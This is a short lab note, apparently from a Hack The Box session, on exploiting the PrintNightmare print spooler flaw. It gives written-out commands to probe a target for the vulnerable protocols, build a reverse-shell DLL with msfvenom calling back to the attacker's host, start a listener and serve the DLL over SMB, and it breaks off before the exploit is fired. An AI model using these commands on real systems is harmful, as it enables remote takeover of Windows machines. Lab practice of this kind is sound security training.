# PrintNightmare


Commands used:

\# check for vulnerability

```bash
┌─[eu-dedicated-18-dhcp]─[10.10.14.3]─[whiskeyneat@htb-msalycnfla]─[/]
└──╼ [★]$ impacket-rpcdump @10.129.194.206 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

\# create a malicious `.dll`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=9002 -f dll -o innocent.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: innocent.dll

```

\# start a listener

```
ncat -lnvp 9002
```

\# host the dll with smbserver

```
sudo impacket-smbserver share -smb2support .
```

\# fire the exploit

This is where I need to find an existing username and password combo

**(I think...)**

---

# 🔗 Useful Links

- [Medium.com | Gain RCE & Privesc on Windows Machines](https://systemweakness.com/printnightmare-gain-rce-privesc-on-windows-machines-a74f37b31ad)
- [Medium | Brute Forcing WINRM using Metasploit for Active Directory Access](https://medium.com/@chryb3r/brute-forcing-winrm-using-metasploit-for-active-directory-access-2ccc72dc30a5)
- [Hacking Articles | WinRM Penetration Testing](https://www.hackingarticles.in/winrm-penetration-testing/)
